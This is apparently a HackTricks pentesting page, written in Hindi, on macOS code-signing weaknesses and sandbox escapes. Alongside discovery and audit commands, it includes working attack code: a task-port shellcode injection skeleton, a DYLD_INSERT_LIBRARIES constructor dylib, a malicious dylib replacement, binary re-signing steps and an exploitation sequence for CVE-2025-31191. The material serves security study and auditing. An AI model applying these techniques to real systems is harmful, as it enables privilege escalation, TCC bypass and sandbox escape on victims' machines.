# macOS Code Signing की कमजोरियाँ और Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) एक **code signature** बनाता है जिसमें **certificate chain** नहीं होती। यह अभी भी signed code का hash बनाता है, इसलिए validation modification का पता लगा सकता है, लेकिन यह ऐसी developer identity प्रदान नहीं करता जिसे कोई अन्य component authenticate कर सके। Executable को replace करके फिर से sign करने पर एक अलग CodeDirectory/CDHash बनता है।<sup>[[1]](#references)[[4]](#references)</sup>

Apple Silicon Macs पर सभी executables के लिए कम-से-कम एक ad-hoc signature आवश्यक होती है। इसका अर्थ है कि आपको कई development tools, Homebrew packages और third-party utilities पर ad-hoc signatures मिलेंगी।

### यह क्यों महत्वपूर्ण है

- **कोई verifiable signer identity नहीं** — केवल path, ad-hoc status या unpinned identifier स्वीकार करने वाले checks यह निर्धारित नहीं कर सकते कि binary किसने बनाई है।
- **Privileged positions** (FDA, daemons, helpers) में मौजूद third-party ad-hoc binaries high-priority targets होते हैं, जब उनकी file या parent directory writable हो।
- CDHash, designated-requirement या requirement-backed TCC check replacement को **notice** करते हैं। Path-based policy शायद ऐसा न करे; actual requirement को inspect करें और grant को दोबारा test करें, यह मानकर न चलें कि re-signing के बाद भी वह कायम रहेगा।

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Debuggable Processes (get-task-allow)

### मूल जानकारी

**`com.apple.security.get-task-allow`** entitlement (या `CS_GET_TASK_ALLOW` flag) किसी authorized debugger को process का task port प्राप्त करने की अनुमति देता है, भले ही Hardened Runtime सामान्यतः इसे रोकता हो। सफल debugger memory पढ़ सकता है, registers modify कर सकता है, code inject कर सकता है और execution को control कर सकता है।<sup>[[3]](#references)</sup>

यह **केवल development builds** के लिए intended है। हालांकि, कुछ third-party binaries production में इस entitlement के साथ ship होते हैं।

> [!CAUTION]
> `get-task-allow` वाली production binary एक मजबूत exploitation primitive है। `taskgated`, caller identity, sandboxing, debugger entitlements और Developer Tools authorization अभी भी यह प्रभावित करते हैं कि कोई particular client task port प्राप्त कर सकता है या नहीं; `lldb`/`debugserver` और intended injector दोनों के साथ test करें। Attachment सफल होने के बाद, injected code target के entitlements, TCC grants और security context के साथ run होता है।

### Discovery
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### Runtime Library-Validation Clearing

Private entitlement **`com.apple.private.security.clear-library-validation`** process launch के समय library validation को disable नहीं करता। इसके बजाय, यह process को runtime पर स्वयं `csops(..., CS_OPS_CLEAR_LV, ...)` call करने की अनुमति देता है। इसके बाद XNU `CS_REQUIRE_LV | CS_FORCED_LV` को clear कर देता है, बशर्ते caller के पास entitlement हो और वह handler की अतिरिक्त checks को पूरा करता हो। परिणामस्वरूप, process library-injection target तभी बन सकता है जब वह उस code path तक पहुंचे जो library validation को clear करता है।<sup>[[4]](#references)[[5]](#references)</sup>

### The Deadly Combination

जब किसी binary में **दोनों** entitlements हों:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (किसी भी dylib को load करता है)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD env vars स्वीकार करता है)

यह code-injection का एक high-value combination है, क्योंकि Hardened Runtime untrusted library और DYLD environment variable दोनों को अनुमति देता है। Launch context अभी भी DYLD variables को scrub कर सकता है (उदाहरण के लिए, protected या privileged execution paths में), इसलिए entitlement pair को unconditional मानने के बजाय exact invocation को verify करें।

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attack: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Temporary Exceptions

### वे Sandbox को कैसे कमजोर करते हैं

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) App Sandbox में छेद कर देते हैं:<sup>[[2]](#references)</sup>

| Exception | यह क्या अनुमति देता है |
|---|---|
| `temporary-exception.mach-lookup.global-name` | system-wide XPC/Mach services से connect करना |
| `temporary-exception.files.absolute-path.read-write` | app container के बाहर files को read/write करना |
| `temporary-exception.iokit-user-client-class` | IOKit user-client connections open करना |
| `temporary-exception.shared-preference.read-only` | अन्य apps की preferences read करना |
| `temporary-exception.files.home-relative-path.read-write` | `~` के relative paths तक access करना |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

सबसे खतरनाक exception **mach-lookup** है — यह sandboxed app को privileged daemons से communicate करने की अनुमति देता है:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### आक्रमण: Mach-Lookup के माध्यम से Sandbox Escape
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Code-Signing Checks Are Not XPC Client Integrity

एक XPC service अपने audit token से code-signing state निकालकर और Apple **platform binary** या `CS_REQUIRE_LV`/`CS_FORCED_LV` वाला client स्वीकार करके connection को authenticate कर सकती है। ये tests executable और चुने गए process flags का विवरण देते हैं; वे यह प्रमाणित नहीं करते कि current address space में केवल trusted code मौजूद है। ImageCapture services पर किए गए research से पता चला कि `/bin/ls` जैसा injectable Apple binary `DYLD_INSERT_LIBRARIES` के माध्यम से attacker dylib लोड कर सकता था और फिर platform client के रूप में connect कर सकता था। Library-validation flags की follow-up जाँच को भी bypass कर लिया गया, जिसके बाद Apple ने macOS 15 में service को अपना private authorization entitlement आवश्यक करने के लिए बदल दिया।<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. `listener:shouldAcceptNewConnection:` (या equivalent low-level XPC handler) को reverse करें और केवल `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV`, या `CS_FORCED_LV` पर आधारित decisions की पहचान करें।
2. ऐसे Apple-signed clients की सूची बनाएँ जो protocol के माध्यम से communicate कर सकते हैं, फिर Hardened Runtime और entitlements की जाँच करें। केवल platform signature यह प्रमाण नहीं है कि DYLD injection blocked है।
3. Candidate को **target macOS build** पर test करें। यदि constructor dylib लोड हो जाती है, तो उसी constructor से service connection बनाएँ, ताकि audit token accepted platform process से संबंधित हो।
4. प्रत्येक vendor patch को फिर से test करें: उसी authorization decision में कोई अन्य mutable process-status flag जोड़ने से confused-deputy primitive समाप्त नहीं हो सकता।
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> DYLD behavior, AMFI policy और service-side checks macOS releases के बीच बदलते रहते हैं। पूरी तरह patched host के विरुद्ध विफलता यह सिद्ध नहीं करती कि वही chain vulnerable release पर भी विफल रही।

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks launches के बीच user की file choice को बनाए रखते हैं। Sandbox extension boot-bound होता है, इसलिए `ScopedBookmarkAgent` इसे validate करता है और एक long-lived HMAC-authenticated bookmark बनाता है; जब app बाद में वह bookmark प्रस्तुत करता है, agent इसे validate करके एक fresh sandbox extension जारी करता है। Signing secret login keychain में stored होता है और bundle identifier का उपयोग करके per-app key derive की जाती है।<sup>[[7]](#references)</sup>

प्रभावित systems पर, keychain ACL ने untrusted process को `com.apple.scopedbookmarksagent.xpc` secret **read** करने से रोका, लेकिन deletion को नहीं रोका। एक compromised sandboxed app item को known secret और attacker-controlled ACL से replace कर सकती थी, app-specific HMAC key derive कर सकती थी, writable container bookmark plist में entries forge कर सकती थी, और `ScopedBookmarkAgent` से उन्हें file-access extensions में exchange करने के लिए कह सकती थी। इससे security-scoped bookmarks का उपयोग करने वाला कोई भी sandboxed application, किसी अतिरिक्त file-picker interaction के बिना, संभावित arbitrary-file-access sandbox escape बन गया। Apple ने March 31, 2025 के security updates में इस issue को ठीक किया।<sup>[[7]](#references)</sup>

### Triage और Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
किसी vulnerable host पर exploitation sequence यह है:

1. Persistent scoped bookmarks का उपयोग करने वाले sandboxed app के अंदर code execution प्राप्त करें।
2. Agent के keychain signing item को ज्ञात secret और permissive ACL वाले item से बदलें।
3. `HMAC-SHA256(key=known_secret, data=bundle_id)` compute करें और app के writable bookmark store में उपयोगी path के लिए bookmark forge करें।
4. Application के सामान्य bookmark-resolution path को trigger करें, ताकि `ScopedBookmarkAgent` एक sandbox extension लौटाए।
5. नए file access का उपयोग करके उस user के लिए उपलब्ध out-of-sandbox execution या data target को overwrite करें।

यह एक **patched-version technique** है: इसका उपयोग trust boundary समझने और unpatched systems का assessment करने के लिए करें, न कि current releases के बारे में assumption के रूप में। Current testing के लिए bookmark parsing, identity binding, keychain-item lifecycle और agent के आसपास confused-deputy behavior पर ध्यान दें।

---

## Private Apple Entitlements

### ये क्या हैं

`com.apple.private.*` से prefixed entitlements **Apple-internal APIs** तक access प्रदान करते हैं, जो documented नहीं हैं और third-party developers के लिए उपलब्ध नहीं हैं। Private entitlements वाले third-party binaries इन्हें enterprise cert, MDM या non-App-Store distribution के माध्यम से प्राप्त करते थे।

### Dangerous Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Full TCC database read/write |
| `com.apple.private.tcc.allow` | Specific TCC services तक access |
| `com.apple.private.security.no-sandbox` | Sandbox के बिना run करना |
| `com.apple.private.iokit` | Direct IOKit driver access |
| `com.apple.private.kernel.\*` | Kernel interface access |
| `com.apple.private.xpc.launchd.job-label` | launchd jobs को register/manage करना |
| `com.apple.rootless.install` | SIP-protected paths में write करना |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## कस्टम Sandbox Profiles (SBPL)

### ये क्या हैं

Binaries, SBPL (Seatbelt Profile Language) में लिखे गए **कस्टम Sandbox Profiles** के साथ आ सकते हैं। ये Profiles default App Sandbox की तुलना में अधिक प्रतिबंधात्मक OR **अधिक permissive** हो सकते हैं।

### कस्टम Profiles का Auditing
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Writable Library Paths

### वे क्या हैं

जब कोई binary dynamic library को ऐसे path से load करता है जिस पर current user **write** कर सकता है, तो उस library को malicious code से replace किया जा सकता है।

### Discovery
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` handler)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [macOS Sandbox Escapes का एक नया युग: एक अनदेखे Attack Surface में गहराई से जाना और 10+ नई Vulnerabilities का पता लगाना](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [CVE-2025-31191 का विश्लेषण: macOS security-scoped bookmarks-आधारित Sandbox Escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
